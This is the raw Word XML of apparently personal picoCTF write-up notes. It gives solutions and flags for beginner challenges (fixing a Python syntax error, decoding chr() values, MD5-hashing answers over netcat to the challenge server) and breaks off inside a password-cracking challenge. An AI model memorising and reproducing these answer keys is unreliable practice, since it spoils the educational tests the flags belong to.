    <w:p w14:paraId="0570336E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C71C5A6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73B83E1A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>fixme2.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E33729D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C0E4F4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011C181F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD60892" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0713A26F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Fix the syntax error in the Python script to print the flag. </w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="174B2FB1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>if flag = ="":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A714D57" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27B0CEFF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">:~/Downloads$ python3 fixme2.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4501DA43" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  File "fixme2.py", line 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="731F1D12" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    if flag = "":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAB287D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            ^</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403CFB15"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nano fixme2.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E792CE4"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fixme2.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BC25FC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">That is correct! Here's your flag: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{3qu4l1ty_n0t_4551gnm3nt_f6a5aefc}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1209F177" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22812F8F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Glitch Cat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510A45CF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1224ED45" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAF2617" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335518C6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A4244B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Our flag printing service has started glitching! </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> saturn.picoctf.net 53933</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E112C35" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03D9DABA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>{gl17ch_m3_n07_' + chr(0x61) + chr(0x34) + chr(0x33) + chr(0x39) + chr(0x32) + chr(0x64) + chr(0x32) + chr(0x65) + '}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A8D382" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02C6F613" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>:~/Downloads$ python3 char.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DAF432" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>{gl17ch_m3_n07_a4392d2e}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD6EBF8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>:~/Downloads$ cat char.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2776B6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>str ='</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>{gl17ch_m3_n07_' + chr(0x61) + chr(0x34) + chr(0x33) + chr(0x39) + chr(0x32) + chr(0x64) + chr(0x32) + chr(0x65) + '}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08021A5C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>print(str)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B9E0A9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>HashingJobApp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1CEC97CD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B88563C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78610F90" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9F0A5D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765D5FC8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to hash with the best, beat this test! </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> saturn.picoctf.net 63116</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77307F3A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="HorizontalLine"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A8DD2C7"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> saturn.picoctf.net 63116</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDBD5C3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please md5 hash the text between quotes, excluding the quotes: 'computers'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A47FE5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">Answer: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CB36CE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>524164822d03894ee68052e183e7ea36</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190242AC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>524164822d03894ee68052e183e7ea36</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C47F0E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Correct.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4AE2E6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please md5 hash the text between quotes, excluding the quotes: 'a car crash'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EF6ED7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">Answer: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767C0D69" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>55067b2a1b8b8110a7411ba64e6f6168</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101B7726" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>55067b2a1b8b8110a7411ba64e6f6168</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B6A5FB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Correct.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620A31FF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please md5 hash the text between quotes, excluding the quotes: 'having a baby'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2CFD19" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">Answer: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F66C6B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>e215dac50d263755ea60abc80a0f3437</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CAA1186" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>e215dac50d263755ea60abc80a0f3437</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436F148D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Correct.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17743B05" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{4ppl1c4710n_r3c31v3d_bf2ceb02}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6108E177" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>:~$ echo -n having a baby |md5sum |awk '{print $1}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBE8A58" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>e215dac50d263755ea60abc80a0f3437</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24CE0BF7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FADCCD6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>PW Crack 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1997F9DF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7659A877" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A0CFDE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C53748D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AB3D8F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId23" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C656600"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level1.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6906D9AD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D9AD38"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27D72259" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    #extend key to secret length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034D847B"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4FE0157C"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62A515BB"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723F960D"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0C6C58E0"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339A4F6F"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41E628CB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>###############################################################################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B7DAEC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69566E24" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33CC5630" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
